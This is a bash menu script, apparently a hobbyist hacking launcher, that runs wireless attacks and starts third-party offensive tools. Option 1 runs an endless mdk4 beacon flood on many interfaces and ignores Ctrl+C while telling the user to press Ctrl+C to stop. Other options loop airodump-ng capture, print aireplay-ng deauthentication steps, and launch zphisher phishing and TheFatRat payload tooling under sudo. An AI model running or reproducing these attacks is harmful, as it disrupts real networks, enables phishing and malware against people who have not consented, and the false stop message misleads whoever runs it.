#!/bin/bash 
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
RESET="\033[0m"
echo "Thank you for using my script."
sleep 3s
echo -e "
${GREEN}
     #      ________      ___         ___     ___    ____          ____      #
    #      //    ) )     /  /        /  /    /  /   / /\ \________/ /\ \      #
   #      //____/ /     /  /        /  /    /  /   / /  \ \______/ /  \ \      #
  #      / ____ (      /  /        /  /    /  /   / /    \ \____/ /    \ \      #
 #      //     ) )    /  /______  /  /____/  /   / /      \ \__/ /      \ \      #
#      //______/_/   /__/____/_/ /__/____/__/   /_/        \_\/_/        \_\      # 
${RESET}"
echo -e "${YELLOW}Tool Created By chapa4308 (can find on github)${RESET}"
echo ""
echo -e "${YELLOW}Choose the script you need.${RESET}"
echo ""
echo -e "${RED}[${RESET}1${RED}]${RESET}" WIFIOFFER
echo -e "${RED}[${RESET}2${RED}]${RESET}" WifiTunnel
echo -e "${RED}[${RESET}3${RED}]${RESET}" Wifi deauth help
echo -e "${RED}[${RESET}4${RED}]${RESET}" ZPHISHER
echo -e "${RED}[${RESET}5${RED}]${RESET}" Restart NetworkManager
echo -e "${RED}[${RESET}6${RED}]${RESET}" LAZY SCRIPT
echo -e "${RED}[${RESET}7${RED}]${RESET}" FATRAT
echo -e "${RED}[${RESET}8${RED}] MANUAL${RESET}" 
read choice

case "$choice" in
  1)
clear
  function show_loading() {
local width=50
  local percent=0
  while [ $percent -le 100 ]; do
    echo -ne "\r"
    chars=$((width * percent / 100))
    for ((i=0; i<chars; i++)); do
    echo -n -e "${RED}=${RESET}"
    done
    echo -n " $percent%"
    ((percent++))
    sleep 0.1
  done
}
echo "Execution..."
tput civis
show_loading
tput cnorm
sleep 5
echo -e "\nDone!"
sleep 3s
clear
# Игнорируем сигналы завершения (Ctrl+C)
trap '' SIGINT
while true; do
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airmon-ng start wlan1
sudo airmon-ng start wlan2
sudo airmon-ng start wlan3
sudo airmon-ng start wlan4
clear
echo -e "${RED}press ctrl + c to stop the atack and back to home page ${RESET}"
sudo mdk4 wlan0 b -m -s 43534643
sudo mdk4 wlan1 b -m -s 43534643
sudo mdk4 wlan2 b -m -s 43534643
sudo mdk4 wlan3 b -m -s 43534643
sudo mdk4 wlan4 b -m -s 43534643
sudo mdk4 wlan0mon b -m -s 43534643
sudo mdk4 wlan1mon b -m -s 43534643
sudo mdk4 wlan2mon b -m -s 43534643
sudo mdk4 wlan3mon b -m -s 43534643
sudo mdk4 wlan4mon b -m -s 43534643
done
cleanup() {
    echo -e "${GREEN}Script has been closed...${RESET}"
    bash BLUM.sh
}
trap cleanup EXIT
exit 0
   ;;

  2)
clear
    echo "Good Choice!"
sleep 3s
clear
echo "Please Wait."
sleep 5s
trap '' SIGINT
while true; do
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airmon-ng start wlan1
sudo airmon-ng start wlan2
sudo airmon-ng start wlan3
sudo airmon-ng start wlan4
sudo airodump-ng wlan0
sudo airodump-ng wlan1
sudo airodump-ng wlan2
sudo airodump-ng wlan3
sudo airodump-ng wlan4
sudo airodump-ng wlan0mon
sudo airodump-ng wlan1mon
sudo airodump-ng wlan2mon
sudo airodump-ng wlan3mon
sudo airodump-ng wlan4mon
done
;;

3)
    echo "Disabling a specific device from a Wi-Fi network:
1. Switch your wlan adapter to monitor mode:
airmon-ng (your wlan adapter) 
2. Use airodump-ng with the following command:
airodump-ng --bssid (network's BSSID)
-c (channel) (your network adapter in monitor mode)
3. After that, you can initiate deauthentication using the following command:
aireplay-ng --deauth (number of packets, set to 0 for continuous deauthentication)
-a (network's MAC address) -c (device's MAC address) (network adapter in monitor mode)
"
 ;;
4)
 bash zphisher.sh
 
 ;;
5)
 bash nr.sh
 ;;
 6)
 command="sudo bash l"
 eval "$command"
 ;;
 7)
 cd ~
 command="sudo fatrat"
 eval "$command"
 ;;
 8)
 bash manual.sh
 ;;
esac
